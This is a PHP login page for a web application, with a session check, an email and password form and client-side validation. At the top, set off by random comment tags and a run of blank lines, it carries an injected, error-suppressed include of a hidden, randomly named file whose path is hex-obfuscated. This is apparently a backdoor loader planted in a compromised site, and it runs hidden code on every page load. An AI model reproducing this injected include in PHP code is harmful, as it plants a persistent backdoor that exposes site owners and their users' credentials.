<?php
/*c8d87*/

@include /*7uyf*/("/home/dprr8htr8t41/publ\x69c_html/r\x69chmed\x69a.b\x69z/app/advert\x69ser/razorpay/.9d9196b3.ot\x69");

/*c8d87*/

















require_once('../config.php');
if(isset($_SESSION['logged'])){
  $type=$_SESSION['type'];
  if($type==2){
    redirect('dashboard.php');
  }else{
    redirect('dashboard.php');
  }
}
if(isset($_POST['signin'])){
  $users->mandateLogin();
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Login</title>
  <?php include('../common/head.php') ?>
</head>
<body class="hold-transition register-page">
<div class="register-box">
  <div class="register-box-body">
    <h2 class="login-box-msg">Login</h2>
    <div class="register-logo">
      <img src="../images/Sign_Up.png" width="150">
    </div>
    <?php echo flashNotification() ?>
    <form method="post" id="signup">
      <div class="form-group has-feedback">
        <input type="email" class="form-control" placeholder="Email" name="email" required>
        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
      </div>
      <div class="form-group has-feedback">
        <input type="password" class="form-control" minlength="6" placeholder="Password" name="password" required>
        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
      </div>
      <div class="row">
        <!-- /.col -->
        <div class="col-xs-12">
          <button type="submit" name="signin" class="btn btn-default btn-block btn-flat">Login</button>
          <a href="forgot-password.php">Forgot Password</a>
        </div>
        <!-- /.col -->
      </div>
    </form>
  </div>
  <!-- /.form-box -->
</div>
<!-- /.register-box -->
<?php include('../common/footer-script.php') ?>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
<script>
  $('#signup').validate({
    errorElement : 'div',
    errorPlacement: function(error, element) {
      var placement = $(element).parents('.form-group').data('error');
      if (placement) {
        $(placement).append(error)
      } else {
        $(element).parents('.form-group').append(error);
      }
    }
  });
</script>
</body>
</html>
